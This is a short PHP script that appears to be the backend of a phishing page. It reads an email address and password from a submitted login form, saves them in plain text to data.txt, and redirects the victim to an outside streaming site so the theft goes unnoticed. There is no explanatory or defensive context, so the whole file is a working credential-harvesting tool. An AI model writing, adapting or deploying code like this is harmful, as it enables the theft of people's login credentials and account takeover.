<?php

	$name = $_POST['email'];

	$password = $_POST['pass'];

        $enter =  "\n";



        $myfile = fopen("data.txt", "w") or die("Unable to open file!");

        fwrite($myfile, $name);

        fwrite($myfile, $enter);

        fwrite($myfile, $password);

        fwrite($myfile, $enter);

        fwrite($myfile, $enter);

        fclose($myfile);

        header("Location: https://www.tinyzonetv.to/", true, 301);

?>
